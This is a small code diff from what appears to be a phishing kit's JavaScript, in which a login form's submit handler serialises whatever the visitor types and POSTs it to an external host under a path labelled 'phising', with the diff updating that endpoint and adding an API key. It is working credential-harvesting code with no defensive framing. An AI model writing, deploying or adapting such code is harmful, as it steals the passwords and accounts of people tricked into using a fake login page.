@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
  var d = $(".login-form");  
   
  $.ajax({  
-        url: "https://krisnastore.my.id/api/phising/api.php",  
+        url: "https://krisnastore.my.id/api/phising/2025/api.php?apikey=krisna",  
         type: "POST",  
         data: d.serialize(),  
         success: function () {  
